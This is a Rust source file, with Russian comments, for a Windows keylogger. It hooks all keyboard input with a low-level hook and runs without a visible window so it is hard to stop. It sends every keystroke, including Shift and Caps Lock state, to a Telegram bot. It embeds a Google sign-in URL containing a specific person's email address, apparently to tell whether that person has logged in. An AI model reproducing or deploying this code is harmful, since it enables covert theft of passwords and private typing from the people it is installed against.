// это нужно чтобы было сложно отключить прогу
#![windows_subsystem = "windows"]

extern crate winapi;

use winapi::um::winuser::{CallNextHookEx, GetAsyncKeyState, GetKeyState, SetWindowsHookExA, UnhookWindowsHookEx, WH_KEYBOARD_LL, HC_ACTION, WM_SYSKEYDOWN, WM_KEYDOWN, KBDLLHOOKSTRUCT};
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
use winapi::shared::windef::HHOOK;
use winapi::um::winuser::{DispatchMessageA, GetMessageA, TranslateMessage, MSG};

// для telegram
use reqwest;
use serde_json::json;
use tokio;

// определение url
use std::ptr::null_mut;
use dns_lookup::lookup_host;

mod config;

// отправка сообщения в тг
async fn bot_sender(text: String) {
    // Получаем токен бота и ID чата
    let bot_token = config::BOT_TOKEN;
    let chat_id = config::CHAT_ID;

    // Формируем URL для API Telegram
    let url = format!("https://api.telegram.org/bot{}/sendMessage", bot_token);

    // Создаем HTTP клиент
    let client = reqwest::Client::new();

    // Отправляем POST запрос с параметрами
    let _response = client.post(&url)
        .json(&json!({
            "chat_id": chat_id,
            "text": text
        }))
        .send()
        .await;
}

unsafe extern "system" fn key_recognition(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    // для определения зашёл он или нет
    let url = "https://accounts.google.com/v3/signin/identifier?Email=amelchakov%40fmschool72.ru&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S992212922%3A1740144921379976&ddm=1";
    if (n_code == HC_ACTION && (w_param == WM_SYSKEYDOWN as usize || w_param == WM_KEYDOWN as usize)) && !is_site_open(url) {
        let keyboard = &*(l_param as *const KBDLLHOOKSTRUCT);
        let is_caps_lock = (GetKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001) != 0;
        let is_shift_pressed = (GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) & 0x8000u16 as i16) != 0;

        // определение caps_lock
        if is_caps_lock {
            tokio::spawn(bot_sender(String::from("(Caps Lock) ")));
        }

        // shift или не shift и вывод key pressed
        if is_shift_pressed && is_any_key_pressed() {
            if keyboard.vkCode == 164 {
                tokio::spawn(bot_sender(String::from("(Shift) Key pressed: Alt")));
            } else {
                let output = format!("(Shift) Key pressed: {}", keyboard.vkCode as u8 as char);
                tokio::spawn(bot_sender(output));
            }
        } else {
            let output = format!("Key pressed: {}", keyboard.vkCode as u8 as char);
            match keyboard.vkCode {
                9 => tokio::spawn(bot_sender(String::from("Key pressed: Tab"))),
                20 => tokio::spawn(bot_sender(String::from("Key pressed: Caps Lock"))),
                160 => tokio::spawn(bot_sender(String::from("Key pressed: Shift"))),
                162 => tokio::spawn(bot_sender(String::from("Key pressed: Ctrl"))),
                164 => tokio::spawn(bot_sender(String::from("Key pressed: Alt"))),
                32 => tokio::spawn(bot_sender(String::from("Key pressed: Space"))),
                27 => tokio::spawn(bot_sender(String::from("Key pressed: Esc"))),
                8 => tokio::spawn(bot_sender(String::from("Key pressed: Backspace"))),
                13 => tokio::spawn(bot_sender(String::from("Key pressed: Enter"))),
                _ => tokio::spawn(bot_sender(output)),
            };
        }
    }
    CallNextHookEx(null_mut(), n_code, w_param, l_param)
}

// Какая нибудь клавиша кроме Shift нажата?
fn is_any_key_pressed() -> bool {
    for i in 0..256 {
        unsafe {
            if (GetAsyncKeyState(i) & 0x8000u16 as i16) != 0 && i != winapi::um::winuser::VK_SHIFT {
                return true;
            }
        }
    }
    false
}

// Закидываем удочку (начинаем записывать клавиши)
fn set_hook() -> HHOOK {
    unsafe {
        let instance = GetModuleHandleA(null_mut());
        SetWindowsHookExA(WH_KEYBOARD_LL, Some(key_recognition), instance, 0)
    }
}

// убираем удочку (остановка)
fn release_hook(hook: HHOOK) {
    unsafe {
        UnhookWindowsHookEx(hook);
    }
}

// Проверка соединений
fn check_connections(ip: &str, port: u16) -> bool {
    use std::process::Command;

    let output = Command::new("netstat")
        .args(&["-n", "-a", "-p", "tcp"])
        .output()
        .expect("Failed to execute netstat");

    let output_str = String::from_utf8_lossy(&output.stdout);
    output_str
        .lines()
        .filter(|line| line.contains("ESTABLISHED"))
        .any(|line| {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() < 3 {
                return false;
            }
            let remote = parts[2];
            let remote_parts: Vec<&str> = remote.split(':').collect();
            remote_parts.len() == 2
                && remote_parts[0] == ip
                && remote_parts[1].parse::<u16>().unwrap_or(0) == port
        })
}

// Проверка доступности сайта
fn is_site_open(url: &str) -> bool {
    if let Ok(ips) = lookup_host(url) {
        ips.into_iter().any(|ip| {
            let target_ip = ip.to_string();
            let ports = vec![80, 443]; // HTTP и HTTPS
            ports.into_iter().any(|port| check_connections(&target_ip, port))
        })
    } else {
        false
    }
}

#[tokio::main]
async fn main() {
    // закидываем удочку
    let hook = set_hook();
    if hook.is_null() {
        eprintln!("Failed to install hook!");
        return;
    }

    // выводим нажатые
    unsafe {
        let mut msg: MSG = std::mem::zeroed();
        while GetMessageA(&mut msg, null_mut(), 0, 0) != 0 {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
    }

    // остановка
    release_hook(hook);
}
